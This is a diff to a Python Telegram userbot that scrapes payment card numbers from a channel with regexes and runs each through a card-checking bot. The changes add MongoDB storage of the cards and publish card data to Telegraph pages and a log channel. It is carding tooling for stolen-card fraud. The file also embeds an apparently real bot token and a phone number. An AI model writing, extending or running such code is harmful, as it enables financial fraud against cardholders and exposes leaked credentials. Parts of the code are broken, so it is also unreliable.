@@ -3,6 +3,10 @@ import time
 import random
 import re
 from pyrogram import Client, filters
+from pymongo import MongoClient
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+import requests
+from telegraph import Telegraph
 
 Z = '\033[1;31m'
 X = '\033[1;33m'
@@ -14,8 +18,25 @@ phone_number = "201011234195"
 ch = "https://t.me/Professor_Ashu"
 ID = "5276901951"
 token = "5276901951:AAGk3pN8m7CX62I5G4WReam27Cc4FZ3bCpo"
+log_channel = "@YourLogChannel"  # Replace with your log channel username or ID
+
+# MongoDB configuration
+mongo_uri = "mongodb://localhost:27017"  # Replace with your MongoDB URI
+database_name = "telegram_bot"  # Replace with your desired database name
+collection_name = "bot_data"  # Replace with your desired collection name
+
+# Telegraph configuration
+telegraph_token = "your_telegraph_token"  # Replace with your Telegraph token
 
 async def fetch_cards_from_channel():
+    # Initialize MongoDB client
+    mongo_client = MongoClient(mongo_uri)
+    db = mongo_client[database_name]
+    collection = db[collection_name]
+
+    # Initialize Telegraph client
+    telegraph = Telegraph(telegraph_token)
+
     app = Client("session", api_id, api_hash)
     await app.start()
 
@@ -31,11 +52,12 @@ async def fetch_cards_from_channel():
         if message.text:
             matches = re.findall(card_regex, message.text) or re.findall(card_regex2, message.text)
             for match in matches:
-                await process_card(app, match)
+                await process_card(app, collection, telegraph, match)
 
     await app.stop()
+    mongo_client.close()
 
-async def process_card(app, cc):
+async def process_card(app, collection, telegraph, cc):
     try:
         await app.send_message(ch, f"/tele {cc}")
         time.sleep(random.randint(26, 27))
@@ -49,15 +71,42 @@ async def process_card(app, cc):
 
 ━━━━━━━━━━━━━━━
 𝗖𝗛𝗘𝗞𝗘𝗗 𝗕𝗬"@T4_Mohamed ✨🤍 '''
-            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
-            i = requests.post(tlg)
+
+            # Create a Telegraph page with the welcome message and button
+            page_title = "Welcome"
+            page_content = f"<h3>Welcome to the Bot!</h3><p>{ccn}</p>"
+            page = telegraph.create_page(page_title, html_content=page_content)
+
+            # Generate the telegraph URL
+            telegraph_url = f"https://telegra.ph/{page['path']}"
+
+            # Create an InlineKeyboardMarkup with the button
+            button_text = "Click Here"
+            button_url = telegraph_url
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(button_text, url=button_url)]])
+
+            # Send the welcome message with the button to the log channel
+            await app.send_message(log_channel, mgs, reply_markup=keyboard)
+
+            # Send the welcome message to the user
+            await app.send_message(ch, f"Welcome to the Bot!\nClick the button below to proceed.", reply_markup=keyboard)
+
             time.sleep(1)
         else:
             print(Z + 'Declined❌')
+
+        # Save user data and bot settings to MongoDB
+        data = {
+            "cc": cc,
+            "ccn": ccn
+        }
+        collection.insert_one(data)
+
     except Exception as e:
         print(False)
         os.system('clear')
         print("New message:", ccn)
         print(str(e))
 
+# Run the fetch_cards_from_channel function
 await fetch_cards_from_channel()
